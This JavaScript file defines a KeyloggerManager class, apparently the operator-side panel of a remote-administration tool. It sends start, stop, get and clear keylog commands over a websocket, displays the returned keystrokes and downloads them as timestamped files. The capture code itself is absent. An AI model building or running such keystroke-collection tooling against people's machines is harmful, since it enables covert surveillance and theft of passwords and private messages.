export class KeyloggerManager {
    constructor(ws, logger) {
        this.ws = ws;
        this.logger = logger;
        this.textarea = document.getElementById('txtKeylogs');
        
        this.setupListeners();
    }

    setupListeners() {
        document.getElementById('btn-keylog-start').addEventListener('click', () => {
            this.start();
        });

        document.getElementById('btn-keylog-stop').addEventListener('click', () => {
            this.stop();
        });

        document.getElementById('btn-keylog-save').addEventListener('click', () => {
            this.downloadAsFile();
        });

        // Prevent typing in textarea
        this.textarea.addEventListener('keydown', (e) => {
            e.preventDefault();
        });

        this.ws.on('keylog_data', (data) => {
            this.textarea.value = data.data;
            this.textarea.scrollTop = this.textarea.scrollHeight;
            this.logger.log("> Keylogs updated.");
        });
    }

    start() {
        this.ws.send('keylog_start');
    }

    stop() {
        this.ws.send('keylog_stop');
    }

    getData() {
        this.ws.send('keylog_get');
    }

    clear() {
        this.ws.send('keylog_clear');
    }

    downloadAsFile() {
        const content = this.textarea.value;
        
        if (!content.trim()) {
            alert('No keylog data to download!');
            return;
        }

        // Tạo Blob từ nội dung
        const blob = new Blob([content], { type: 'text/plain;charset=utf-8;' });
        
        // Tạo URL từ Blob
        const link = document.createElement('a');
        const url = URL.createObjectURL(blob);
        
        // Đặt tên file với timestamp
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
        link.setAttribute('href', url);
        link.setAttribute('download', `keylogs_${timestamp}.txt`);
        link.style.visibility = 'hidden';
        
        // Thêm vào DOM, click và xóa
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Giải phóng URL
        URL.revokeObjectURL(url);
        
        this.logger.log(`> Keylogs downloaded: keylogs_${timestamp}.txt`);
    }
}